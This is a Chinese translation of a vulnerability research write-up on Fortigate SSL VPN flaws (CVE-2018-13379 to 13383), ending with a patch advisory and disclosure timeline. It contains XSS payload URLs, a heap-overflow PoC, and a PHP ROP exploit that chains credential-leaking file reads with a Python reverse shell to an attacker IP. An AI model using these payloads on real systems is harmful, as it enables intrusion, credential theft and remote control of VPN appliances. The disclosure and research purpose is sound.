> 原文链接: https://www.anquanke.com//post/id/184097 


# Fortigate SSL VPN漏洞分析


                                阅读量   
                                **333000**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者orange，文章来源：blog.orange.tw
                                <br>原文地址：[https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html](https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t012dd07d2005bcd86e.jpg)](https://p1.ssl.qhimg.com/t012dd07d2005bcd86e.jpg)



## 0x00 前言

上个月我们分析了Palo Alto Networks GlobalProtect中的[RCE漏洞](https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/)，今天来看重头戏：针对Fortigate SSL VPN的漏洞分析。我们已经在Black Hat和DEFCON上发表过相关演讲，如果大家想了解更多细节，可以下载[演讲文稿](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)。

整个故事从8月份开始讲起，当时我们开始研究SSL VPN。与site-to-site VPN相比（如IPSEC和PPTP），SSL VPN更便于使用，并且可以与任何网络环境相兼容。因此，现在SSL VPN已经成为企业领域最流行的远程访问方式。

然而，如果这类“可靠的”设备不再安全那怎么办？虽然这类设备是重要的企业资产，但通常却疏于管理。根据我们对财富500强企业的调查结果，前3大SSL VPN厂商占据了75%的市场份额，SSL VPN市场并没有太复杂，因此一旦我们在常见的SSL VPN中找到严重漏洞，就会造成巨大的影响。此外，SSL VPN必须对互联网开放，因此也是绝佳的攻击点。

在研究之初，我们对SSL VPN主要企业涉及到的CVE数量进行了统计，结果如下：

[![](https://p3.ssl.qhimg.com/t01650b66917bfae2c0.png)](https://p3.ssl.qhimg.com/t01650b66917bfae2c0.png)

似乎Fortinet以及Pulse Secure是最为安全的解决方案，但这是真的吗？我们一直都是勇敢的挑战者，因此决定开始寻找Fortinet及Pulse Secure的弱点。本文介绍了关于Fortigate SSL VPN漏洞方面的内容，下一篇文章会介绍关于Pulse Secure的内容，那部分最为精彩，敬请关注。



## 0x01 Fortigate SSL VPN

Fortinet将其SSL VPN产品线称为Fortigate SSL VPN，主要应用于最终用户以及中型企业。目前互联网上这些服务器的数量已超过48万台，主要集中在亚洲及欧洲区域。Fortigate SSL VPN在URL中有一个`/remote/login`特征，并且包含如下3个特点：

1、一体化程序

我们从文件系统开始研究，尝试列出`/bin/`目录中的所有程序，发现这些都是符号链接，指向`/bin/init`，如下所示：

[![](https://p3.ssl.qhimg.com/t01a72cfc3bf0e07c21.png)](https://p3.ssl.qhimg.com/t01a72cfc3bf0e07c21.png)

Fortigate将所有程序编译并配置成一个统一的程序，因此会让最终的`init`程序变得非常庞大。这个程序包含上千个函数，并且没有符号，只包含SSL VPN所需的必要程序，整个环境对黑客来说非常不友好。比如，我们在这个文件系统中甚至找不到`/bin/ls`或者`/bin/cat`。

2、Web守护进程

Fortigate上运行着2个web接口，一个用于管理界面，监听在443端口，由`/bin/httpsd`负责处理；另一个是普通用户界面，默认监听在4433端口上，由`/bin/sslvpnd`负责处理。通常情况下，管理员页面不会对互联网开放，因此我们只能访问用户接口。

经过调查后，我们发现这个web服务器是apache的修改版，但竟然源自于2002年的apache。显然官方对2002版的apache进行了修改，添加了自己的功能。我们可以对照apache的源码，来加快分析进度。

这两个web服务都将自己的apache模块编译到程序文件中，以处理每个URL路径。我们可以找到标明处理函数的一张表，继续深入研究这些函数。

3、WebVPN

WebVPN是一种非常方便的代理功能，可以让我们简单通过浏览器连接到所有服务。WebVPN支持许多协议，比如HTTP、FTP、RDP，也能处理各种web资源，比如WebSocket以及Flash。为了正确处理网站业务，WebVPN会解析HTML，重写所有网址。这个过程涉及到大量字符串操作，很容易产生内存错误。



## 0x02 漏洞描述

我们找到了一些漏洞：

### [CVE-2018-13379](https://fortiguard.com/psirt/FG-IR-18-384)：预认证任意文件读取

在获取对应的语言文件时，目标设备会使用`lang`参数来生成json文件路径：

```
snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
```

该操作没有保护措施，会直接附加文件扩展名。看上去我们似乎只能读取json文件，然而实际上我们可以滥用`snprintf`的功能。根据man页面，`snprintf`最多会将`size-1`大小的数据写入输出字符串中。因此，我们只需要让数据超过缓冲区大小，就可以剔除`.json`扩展符，从而实现任意文件读取。

### [CVE-2018-13380](https://fortiguard.com/psirt/FG-IR-18-383)：预认证XSS

目标服务存在几个XSS点，如下所示：

```
/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
```

```
/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
```

```
/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;
```

### [CVE-2018-13381](https://fortiguard.com/psirt/FG-IR-18-387)：预认证堆溢出

目标分2阶段对HTML实体代码进行编码。服务器首先会计算编码字符串所需的缓冲区大小，然后将编码结果存放到该缓冲区中。举个例子，在计算阶段，`&lt;`字符串的编码结果为`&lt;`，这样就会占用5个字节。如果服务器碰到了以`&amp;#`开头的字符串（比如`&lt;`），就认为该字符出已经经过编码，会直接计算字符串长度，例如：

```
c = token[idx];
if (c == '(' || c == ')' || c == '#' || c == '&lt;' || c == '&gt;')
    cnt += 5;
else if(c == '&amp;' &amp;&amp; html[idx+1] == '#')
    cnt += len(strchr(html[idx], ';')-idx);
```

然而，长度计算过程以及编码过程中存在不一致的部分，编码部分并没有充分考虑到这种情况。

```
switch (c)
`{`
    case '&lt;':
        memcpy(buf[counter], "&lt;", 5);
        counter += 4;
        break;
    case '&gt;':
    // ...
    default:
        buf[counter] = c;
        break;
    counter++;
`}`
```

如果我们输入恶意字符串`&amp;#&lt;&lt;&lt;;`，那么`&lt;`仍然会被编码为`&lt;`，因此结果会变成`&amp;#&lt;&lt;&lt;;`。这显然比预期的6字节长度要大，因此会造成堆缓冲区溢出。

PoC：

```
import requests

data = `{`
    'title': 'x', 
    'msg': '&amp;#' + '&lt;'*(0x20000) + ';&lt;', 
`}`
r = requests.post('https://sslvpn:4433/message', data=data)
```

### [CVE-2018-13382](https://fortiguard.com/psirt/FG-IR-18-389)：magic后门

在登录页面，我们找到了一个特别的参数：`magic`。一旦该参数值匹配硬编码的一个字符串，我们就可以修改任何用户的密码。

[![](https://p1.ssl.qhimg.com/t01e6d6a998f1b5f876.png)](https://p1.ssl.qhimg.com/t01e6d6a998f1b5f876.png)

根据我们的调查结果，目前还有许多Fortigate SSL VPN没有打上补丁。因此，考虑到这个漏洞的严重程度，我们并不会公布这个魔术字符串。然而，来自CodeWhite的研究人员已经[复现](https://twitter.com/codewhitesec/status/1145967317672714240)了这个漏洞，因此其他攻击者很快也会成功利用这个漏洞。请大家尽快更新手头上的Fortigate ASAP。

[![](https://p4.ssl.qhimg.com/t01da933c662d0d48f2.png)](https://p4.ssl.qhimg.com/t01da933c662d0d48f2.png)

### [CVE-2018-13383](https://fortiguard.com/psirt/FG-IR-18-388)：后认证堆溢出

这个漏洞位于WebVPN功能中。在解析HTML中的JavaScript时，服务器会尝试使用如下代码将内容拷贝到缓冲区中：

```
memcpy(buffer, js_buf, js_buf_len);
```

缓冲区大小固定为`0x2000`，但输入字符串没有长度限制，因此这里存在堆缓冲区问题。需要注意的是，这个漏洞可以溢出Null字节，这在漏洞利用中非常有用。

为了触发缓冲区溢出，我们需要将利用代码放在HTTP服务器上，然后要求SSL VPN以正常用户权限代理我们的利用请求。



## 0x03 漏洞利用

一开始官方公告中表明这些漏洞不会造成RCE风险，实际上这里官方有些误解。接下来我们将演示如何在不需要身份认证的情况下，从用户登录界面来利用漏洞。

### <a class="reference-link" name="CVE-2018-13381"></a>CVE-2018-13381

我们首先尝试利用这个预认证堆溢出漏洞。然而这个漏洞利用起来有个问题：不支持溢出Null字节。通常情况下，这并不是非常严重的问题。堆利用技术现在应该可以克服这个困难。然而我们发现在Fortigate上尝试堆风水简直是一场灾难，该设备上存在一些阻碍，会让堆变得不稳定，难以控制。这些因素包括：

1、单线程，单进程，单allocator

Web守护程序会使用`epoll()`来处理多个连接，没有采用多进程或者多线程方案，并且主进程和程序都使用了相同的堆：`JeMalloc`。这意味着所有连接对应的所有操作所分配的内存都在同一个堆上，因此整个堆会变得非常乱。

2、定期触发操作

这种方式会干扰堆布局，并且无法控制。我们无法仔细布置堆结构，稍微不慎就会导致堆被摧毁。

3、引入Apache内存管理机制

分配的内存空间不会被`free()`，除非连接结束。我们无法在单个连接中布置堆结构。实际上这种方式可以有效缓解堆漏洞，特别是UAF（use-after-free）类漏洞。

4、JeMalloc

JeMalloc会隔离元数据以及用户数据，因此我们难以修改元数据来把玩堆布局。此外，JeMalloc会将小型对象集中管理，这样也限制了我们的利用途径。

我们在这里陷入泥潭，因此选择尝试别的道路。如果大家成功利用该漏洞，欢迎随时联系我们。

### <a class="reference-link" name="CVE-2018-13379%20+%20CVE-2018-13383"></a>CVE-2018-13379 + CVE-2018-13383

这是预认证（pre-auth）文件读取漏洞以及后认证（post-auth）堆溢出漏洞的组合使用。一个用于通过身份认证，另一个用于搞定shell。

1、身份认证

我们首先利用CVE-2018-13379来泄露会话文件。这个session文件中包含一些有价值的信息，比如用户名以及明文密码，这样我们就可以轻松登录。

[![](https://p1.ssl.qhimg.com/t01fe812f942b350f29.png)](https://p1.ssl.qhimg.com/t01fe812f942b350f29.png)

2、搞定shell

成功登录后，我们可以要求SSL VPN代理位于我们恶意HTTP服务器上的利用载荷，然后触发堆溢出。

由于前面提到的问题，我们需要寻找合适的目标来溢出。我们无法精心控制堆布局，但有可能寻找经常出现的某些目标。如果这个目标随处可见，并且每次触发漏洞时都涉及到，那么我们就可以轻松覆盖该目标，然而我们很难从这个庞大的程序中找到这样一个目标，因此我们再一次被困住。最终我们开始fuzz服务端，尝试寻找一些有用的信息。

我们实现了一次有趣的服务器崩溃。令人惊讶的是，我们基本上控制了程序计数器（program counter）。

[![](https://p5.ssl.qhimg.com/t012a843e3790999caf.png)](https://p5.ssl.qhimg.com/t012a843e3790999caf.png)

崩溃信息如下所示，这也是我们那么喜爱fuzz的原因所在：

```
Program received signal SIGSEGV, Segmentation fault.
0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
2: /x $rax = 0x41414141
1: x/i $pc
=&gt; 0x7fb908d12a77 &lt;SSL_do_handshake+23&gt;: callq *0x60(%rax)
(gdb)
```

崩溃点位于[`SSL_do_handshake()`](https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716)中：

```
int SSL_do_handshake(SSL *s)
`{`
    // ...

    s-&gt;method-&gt;ssl_renegotiate_check(s, 0);

    if (SSL_in_init(s) || SSL_in_before(s)) `{`
        if ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == NULL) `{`
            struct ssl_async_args args;

            args.s = s;

            ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);
        `}` else `{`
            ret = s-&gt;handshake_func(s);
        `}`
    `}`
    return ret;
`}`
```

我们覆盖了[`SSL`结构](https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080)中[method](https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087)函数的函数表，这样当目标尝试执行`s-&gt;method-&gt;ssl_renegotiate_check(s, 0);`时就会崩溃。

这实际上是漏洞利用的绝佳目标。`SSL`结构可以被轻易触发，并且大小与我们的JavaScript缓冲区接近，可以很有可能与我们的缓冲区相距一定偏移量。根据代码，我们可以看到`ret = s-&gt;handshake_func(s);`语句会调用一个函数指针，这也是控制程序执行流的绝佳选择。发现这一点后，我们的利用策略就逐渐清晰起来。

首先我们通过大量正常请求，利用`SSL`结构来喷射堆，然后再溢出`SSL`结构。

[![](https://p1.ssl.qhimg.com/t01ccaefe4e01f5edee.png)](https://p1.ssl.qhimg.com/t01ccaefe4e01f5edee.png)

我们将php版的PoC放置在HTTP服务器上：

```
&lt;?php
    function p64($address) `{`
        $low = $address &amp; 0xffffffff;
        $high = $address &gt;&gt; 32 &amp; 0xffffffff;
        return pack("II", $low, $high);
    `}`
    $junk = 0x4141414141414141;
    $nop_func = 0x32FC078;

    $gadget  = p64($junk);
    $gadget .= p64($nop_func - 0x60);
    $gadget .= p64($junk);
    $gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ;
    $gadget .= p64($junk);
    $gadget .= p64($junk);
    $gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
    $gadget .= p64(0x1bed1f6); // pop rax ; ret ;
    $gadget .= p64(0x58);
    $gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret  ;
    $gadget .= p64(0x1366639); // call system ;
    $gadget .= "python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;";

    $p  = str_repeat('AAAAAAAA', 1024+512-4); // offset
    $p .= $gadget;
    $p .= str_repeat('A', 0x1000 - strlen($gadget));
    $p .= $gadget;
?&gt;
&lt;a href="javascript:void(0);&lt;?=$p;?&gt;"&gt;xxx&lt;/a&gt;
```

这个PoC可以分成3大部分：

1、伪造的SSL结构。

`SSL`结构距离我们的缓冲区保持一定偏移量，因此我们可以准确伪造这个结构。为了避免目标崩溃，我们将`method`指向包含`void`函数指针的某个位置。此时该参数为`SSL`自身结构（`s`）。然而`method`前只有8字节可用，我们不能在HTTP服务端上简单调用`system("/bin/sh");，`因此这个空间不足以运行我们的反弹shell命令。不过这里要感谢这个庞大的程序文件，我们很容易找到许多ROP gadget。比如我们就找到了方便stack pivot的一个gadget：

```
push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
```

因此我们将`handshake_func`设置为这个gadget，将`rsp` move到我们的`SSL`结构，进一步发起ROP攻击。

2、ROP链

这里的ROP链比较简单。我们只需简单前移`rdi`，就可以为我们的反弹shell命令预留足够的空间。

3、溢出字符串

最终我们拼接溢出空间和利用代码，成功溢出`SSL`结构后，我们就可以得到shell。

我们的利用代码需要多次运行，因为利用过程中我们可能会溢出某些重要数据，导致程序在执行到`SSL_do_handshake`前崩溃。不论如何，Fortigate部署的watchdog非常可靠，利用过程依然比较稳定，只需要花费1~2分钟就能得到反弹shell。

漏洞利用过程可参考[此处视频](https://youtu.be/Aw55HqZW4x0)。

请大家尽快升级到FortiOS 5.4.11、5.6.9、6.0.5、6.2.0及以上版本。



## 0x04时间线
- 2018年12月11日：向Fortinet报告漏洞情况
- 2019年3月19日：官方设定补丁推出时间点
- 2019年5月24日：官方发布安全公告